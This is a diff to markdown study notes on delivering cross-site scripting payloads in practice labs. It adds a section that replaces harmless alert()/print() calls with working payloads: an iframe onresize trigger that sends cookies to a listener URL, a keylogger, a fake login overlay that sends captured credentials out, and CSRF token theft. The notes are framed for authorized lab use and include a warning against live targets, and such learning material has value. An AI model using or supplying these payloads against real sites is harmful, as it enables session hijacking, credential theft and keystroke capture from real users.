@@ -1,4 +1,4 @@
-# XSS Payload Delivery Techniques  
+# XSS Payload Delivery Techniques
 
 Reference notes on how an attacker delivers an XSS payload to a victim, and how to receive the resulting data back, for use in controlled lab/practice environments.
 
@@ -109,7 +109,63 @@ This is generally the fastest option for practice since there's no local server 
 - `webhook.site` — generates an instant unique URL, shows incoming requests in a browser dashboard. No setup.
 - Burp Collaborator — similar to Caido OAST, built into Burp Suite.
 
-## 4. Summary Table
+## 4. Proof-of-Concept vs Real-World Impact
+
+Lab payloads like `alert()` or `print()` are **harmless proof-of-concept (PoC) calls**, not real attacks. They exist so that:
+
+- The result is visible without needing any extra server/listener.
+- An automated grading checker can detect the function call and confirm the vulnerability is exploitable.
+- No legal/ethical issues arise from demonstrating impact in a shared lab environment.
+
+They only prove that **arbitrary JavaScript execution is possible** at that injection point. A real attacker would replace the PoC call with an actual payload. The trigger mechanism (same bypass, same event, same delivery method) stays identical — only the function body changes.
+
+Example — reusing the same `onresize` bypass technique, but with real payloads instead of `print()`:
+
+**Session cookie theft:**
+```html
+<iframe src="https://victim-site.com/?search=%22%3E%3Cbody%20onresize=xss()%3E" onload="this.style.width='100px'">
+<script>
+function xss() {
+  fetch('https://LISTENER-URL/steal?c=' + document.cookie);
+}
+</script>
+```
+
+**Keylogging:**
+```javascript
+function xss() {
+  document.addEventListener('keypress', e => {
+    fetch('https://LISTENER-URL/keys?k=' + e.key);
+  });
+}
+```
+
+**Phishing form injection (fake login overlay):**
+```javascript
+function xss() {
+  document.body.innerHTML = `
+    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999">
+      <h2>Session expired. Please log in again.</h2>
+      <form onsubmit="fetch('https://LISTENER-URL/creds?u='+this.u.value+'&p='+this.p.value);return false;">
+        <input name="u" placeholder="Username">
+        <input name="p" type="password" placeholder="Password">
+        <button>Log in</button>
+      </form>
+    </div>`;
+}
+```
+
+**CSRF token theft (to later perform a sensitive action as the victim):**
+```javascript
+function xss() {
+  const token = document.querySelector('input[name="csrf"]').value;
+  fetch('https://LISTENER-URL/token?t=' + token);
+}
+```
+
+The delivery method (Type 1 link vs Type 2 attacker-hosted page) and the receiving setup (self-hosted listener, Caido OAST, webhook.site) from the sections above apply the same way regardless of which payload body is used.
+
+## 5. Summary Table
 
 | Trigger needs a page? | Needs a listener? | Example |
 |---|---|---|
@@ -118,8 +174,9 @@ This is generally the fastest option for practice since there's no local server 
 | Yes (forced trigger) | No | `onresize` payload inside iframe, calls `print()` only |
 | Yes (forced trigger) | Yes | `onresize` payload inside iframe, `fetch()`s cookie to listener |
 
-## 5. Practical Notes
+## 6. Practical Notes
 
 - A "page" is only needed when the trigger condition can't fire by itself.
 - A "listener" is only needed when the payload sends data somewhere (as opposed to just proving execution with `alert()`/`print()`).
 - For controlled lab practice: self-hosted server + tunnel works, but Caido's OAST (or Collaborator) removes the setup step and is usually faster to iterate with.
+- After passing a lab with `alert()`/`print()`, replace the PoC call with a real payload (cookie theft, keylogger, etc.) in your own controlled environment (DVWA, Juice Shop, a personal test app) to see the full impact — never on a live/production target without authorization.
